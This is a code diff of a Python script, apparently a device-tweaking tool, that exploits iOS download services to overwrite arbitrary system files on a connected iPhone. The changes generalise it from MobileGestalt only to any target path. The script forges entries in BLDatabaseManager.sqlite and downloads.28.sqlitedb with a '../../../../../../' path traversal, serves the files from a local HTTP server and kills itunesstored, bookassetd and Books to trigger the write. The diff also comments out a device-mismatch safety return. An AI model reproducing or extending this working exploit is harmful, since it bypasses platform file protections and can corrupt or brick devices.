@@ -55,7 +55,7 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
     http_thread = threading.Thread(target=start_http_server, daemon=True)
     http_thread.start()
     ip, port = info_queue.get()
-    print(f"Hosting temporary http server on: http://{ip}:{port}/")
+    click.secho(f"Hosting temporary http server on: http://{ip}:{port}/", fg="bright_black")
 
     afc = AfcService(lockdown=service_provider)
     pc = ProcessControl(dvt)
@@ -81,8 +81,24 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
                 f.write(uuid)
             break
     else:
-        print("Saved bookassetd container UUID: " + uuid)
+        click.secho("Saved bookassetd container UUID: " + uuid, fg="green")
     
+    
+    # Modify BLDatabaseManager.sqlite
+    # Copy BLDatabaseManager.sqlite to tmp.BLDatabaseManager.sqlite
+    filetooverwritename = os.path.basename(path)
+    shutil.copyfile("BLDatabaseManager.sqlite", "tmp.BLDatabaseManager.sqlite")
+    blconn = sqlite3.connect("tmp.BLDatabaseManager.sqlite")
+    cursor = blconn.cursor()
+    cursor.execute(f"""
+    UPDATE ZBLDOWNLOADINFO
+    SET 
+        ZASSETPATH = '{path}.zassetpath',
+        ZDOWNLOADID = '../../../../../../{path}',
+        ZPLISTPATH = '/var/mobile/Media/Downloads/{filetooverwritename}'
+    """)
+    blconn.commit()
+
     # Modify downloads.28.sqlitedb
     # Copy downloads.28.sqlitedb to tmp.downloads.28.sqlitedb
     shutil.copyfile("downloads.28.sqlitedb", "tmp.downloads.28.sqlitedb")
@@ -101,7 +117,7 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
     END
     WHERE local_path LIKE '/private/var/containers/Shared/SystemGroup/%/Documents/BLDatabaseManager/BLDatabaseManager.sqlite%'
     """)
-    bldb_server_prefix = f"http://{ip}:{port}/BLDatabaseManager.sqlite"
+    bldb_server_prefix = f"http://{ip}:{port}/tmp.BLDatabaseManager.sqlite"
     cursor.execute(f"""
     UPDATE asset
     SET url = CASE
@@ -115,7 +131,7 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
     WHERE url LIKE '%/BLDatabaseManager.sqlite%'
     """)
     conn.commit()
-            
+
     # Kill bookassetd and Books processes to stop them from updating BLDatabaseManager.sqlite
     procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
     pid_bookassetd = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
@@ -127,18 +143,16 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
         click.secho(f"Killing Books pid {pid_books}...", fg="yellow")
         pc.kill(pid_books)
     
-    # Upload com.apple.MobileGestalt.plist
-    click.secho("Uploading com.apple.MobileGestalt.plist", fg="yellow")
-    remote_file = "com.apple.MobileGestalt.plist"
-    AfcService(lockdown=service_provider).push(mg_file, remote_file)
-    
+    # Upload the file
+    click.secho("Uploading " + os.path.basename(overridefile), fg="yellow")
+    AfcService(lockdown=service_provider).push(overridefile, "Downloads/" + os.path.basename(path))
+
     # Upload downloads.28.sqlitedb
     click.secho("Uploading downloads.28.sqlitedb", fg="yellow")
     afc.push("tmp.downloads.28.sqlitedb", "Downloads/downloads.28.sqlitedb")
     afc.push("tmp.downloads.28.sqlitedb-shm", "Downloads/downloads.28.sqlitedb-shm")
     afc.push("tmp.downloads.28.sqlitedb-wal", "Downloads/downloads.28.sqlitedb-wal")
-    conn.close()
-
+    
     # Kill itunesstored to trigger BLDataBaseManager.sqlite overwrite
     procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
     pid_itunesstored = next((pid for pid, p in procs.items() if p['ProcessName'] == 'itunesstored'), None)
@@ -149,11 +163,11 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
     # Wait for itunesstored to finish download and raise an error
     click.secho("Waiting for itunesstored to finish download...", fg="yellow")
     for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
-        if (posixpath.basename(syslog_entry.filename) == 'itunesstored') and \
-            "Install complete for download: 6936249076851270152 result: Failed" in syslog_entry.message:
+        if "Install complete for download: 6936249076851270150 result: Failed" in syslog_entry.message:
+            click.secho("download complete!", fg="bright_black")
             break
     
-    # Kill bookassetd and Books processes to trigger MobileGestalt overwrite
+    # Kill bookassetd and Books processes to trigger file overwrite
     pid_bookassetd = next((pid for pid, p in procs.items() if p['ProcessName'] == 'bookassetd'), None)
     pid_books = next((pid for pid, p in procs.items() if p['ProcessName'] == 'Books'), None)
     if pid_bookassetd:
@@ -171,51 +185,59 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
         return
     
     click.secho("If this takes more than a minute please try again.", fg="yellow")
-    click.secho("Waiting for MobileGestalt overwrite to complete...", fg="yellow")
-    success_message = "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist) [Install-Mgr]: Marking download as [finished]"
+    click.secho("Waiting for file overwrite to complete...", fg="yellow")
+    success_message = path + ") [Install-Mgr]: Marking download as [finished]"
     for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
         if (posixpath.basename(syslog_entry.filename) == 'bookassetd') and \
                 success_message in syslog_entry.message:
             break
     pc.kill(pid_bookassetd)
-    
-    click.secho("Respringing", fg="green")
+    click.secho("Overwrite successful! Respringing...", fg="green")
     procs = OsTraceService(lockdown=service_provider).get_pid_list().get("Payload")
     pid = next((pid for pid, p in procs.items() if p['ProcessName'] == 'backboardd'), None)
     pc.kill(pid)
-    
     click.secho("Done!", fg="green")
+
+    blconn.close()
+    conn.close()
     
     sys.exit(0)
 
-def _run_async_rsd_connection(address, port):
-    async def async_connection():
-        async with RemoteServiceDiscoveryService((address, port)) as rsd:
-            loop = asyncio.get_running_loop()
-
-            def run_blocking_callback():
-                with DvtSecureSocketProxyService(rsd) as dvt:
-                    main_callback(rsd, dvt)
-
-            await loop.run_in_executor(None, run_blocking_callback)
-
+async def _run_async_rsd_connection(address, port):
     try:
-        loop = asyncio.get_event_loop()
-        if loop.is_running():
-            with concurrent.futures.ThreadPoolExecutor() as executor:
-                future = executor.submit(asyncio.run, async_connection())
-                future.result()
-        else:
-            loop.run_until_complete(async_connection())
-    except RuntimeError:
-        asyncio.run(async_connection())
+        async def async_connection():
+            async with RemoteServiceDiscoveryService((address, port)) as rsd:
+                click.secho("connected to tunnel", fg="green")
+                loop = asyncio.get_running_loop()
+                    
+                def run_blocking_callback():
+                    with DvtSecureSocketProxyService(rsd) as dvt:
+                        main_callback(rsd, dvt)
+                    
+                await loop.run_in_executor(None, run_blocking_callback)
+
+        click.secho(f"attempt connection", fg="bright_black")
+        await async_connection()
+
+        return
+
+    except (ConnectionRefusedError, OSError) as e:
+        click.secho(f"tunnel connect failed: {e}", fg="red")
+        raise
 
 def exit_func(tunnel_proc):
     tunnel_proc.terminate()
 
 async def create_tunnel(udid):
-    # TODO: check for Windows
-    tunnel_process = subprocess.Popen(f"sudo pymobiledevice3 lockdown start-tunnel --script-mode --udid {udid}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    command = [
+        sys.executable,
+        "-m", "pymobiledevice3",
+        "lockdown", "start-tunnel",
+        "--script-mode",
+        "--udid", udid
+    ]
+    tunnel_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
     atexit.register(exit_func, tunnel_process)
     while True:
         output = tunnel_process.stdout.readline()
@@ -241,12 +263,15 @@ async def create_tunnel(udid):
                 sys.exit()
             break
     rsd_str = str(rsd_val)
-    print("Sucessfully created tunnel: " + rsd_str)
+    click.secho("Sucessfully created tunnel: " + rsd_str, fg="green")
+    click.secho(f"address: {rsd_str.split(" ")[0]}", fg="bright_black")
+    port = int(rsd_str.split(" ")[1])
+    click.secho(f"port: {port}", fg="bright_black")
+    time.sleep(2)
     return {"address": rsd_str.split(" ")[0], "port": int(rsd_str.split(" ")[1])}
 
-async def connection_context(udid):# Create a LockdownClient instance
+async def connection_context(service_provider):# Create a LockdownClient instance
     try:
-        service_provider = create_using_usbmux(serial=udid)
         marketing_name = service_provider.get_value(key="MarketingName")
         marketing_name = service_provider.get_value(key="MarketingName")
         device_build = service_provider.get_value(key="BuildVersion")
@@ -256,23 +281,24 @@ async def connection_context(udid):# Create a LockdownClient instance
         click.secho("Please keep your device unlocked during the process.", fg="blue")
         
         # Validate MobileGestalt file
-        mg_contents = plistlib.load(open(mg_file, "rb"))
-        cache_extra = mg_contents["CacheExtra"]
-        if cache_extra is None:
-            click.secho("Error: Invalid com.apple.MobileGestalt.plist file", fg="red")
-            return
-        cache_build_version = mg_contents["CacheVersion"]
-        cache_product_type = cache_extra["0+nc/Udy4WNG8S+Q7a/s1A"] # ThinningProductType
-        if cache_build_version != device_build or cache_product_type != device_product_type:
-            click.secho("Error: It seems you are using MobileGestalt file for a different device", fg="red")
-            click.secho(f"Device Build: {device_build}, MobileGestalt Build: {cache_build_version}", fg="red")
-            click.secho(f"Device ProductType: {device_product_type}, MobileGestalt ProductType: {cache_product_type}", fg="red")
-            return
+        if os.path.basename(path) == "com.apple.MobileGestalt.plist":
+            mg_contents = plistlib.load(open(overridefile, "rb"))
+            cache_extra = mg_contents["CacheExtra"]
+            if cache_extra is None:
+                click.secho("Error: Invalid com.apple.MobileGestalt.plist file", fg="red")
+                return
+            cache_build_version = mg_contents["CacheVersion"]
+            cache_product_type = cache_extra["0+nc/Udy4WNG8S+Q7a/s1A"] # ThinningProductType
+            if cache_build_version != device_build or cache_product_type != device_product_type:
+                click.secho("Error: It seems you are using MobileGestalt file for a different device", fg="red")
+                click.secho(f"Device Build: {device_build}, MobileGestalt Build: {cache_build_version}", fg="red")
+                click.secho(f"Device ProductType: {device_product_type}, MobileGestalt ProductType: {cache_product_type}", fg="red")
+                # return
         
         if device_version >= parse_version('17.0'):
-            available_address = await create_tunnel(udid)
+            available_address = await create_tunnel(service_provider.udid)
             if available_address:
-                _run_async_rsd_connection(available_address["address"], available_address["port"])
+                await _run_async_rsd_connection(available_address["address"], available_address["port"])
             else:
                 raise Exception("An error occurred getting tunnels addresses...")
         else:
@@ -288,10 +314,12 @@ async def connection_context(udid):# Create a LockdownClient instance
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
-        print("Usage: python run.py <udid> /path/to/com.apple.MobileGestalt.plist")
+        print("Usage: python run.py /path/to/local/file (ex. ./MobileGestalt/com.apple.MobileGestalt.plist) /path/to/file_on_iOS (like /private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist)")
         exit(1)
     
-    mg_file = sys.argv[2]
+    lockdown = create_using_usbmux()
+    overridefile = sys.argv[1]
+    path = sys.argv[2]
     info_queue = queue.Queue()
     os.chdir(os.path.dirname(os.path.abspath(__file__)))
-    asyncio.run(connection_context(sys.argv[1]))
+    asyncio.run(connection_context(lockdown))
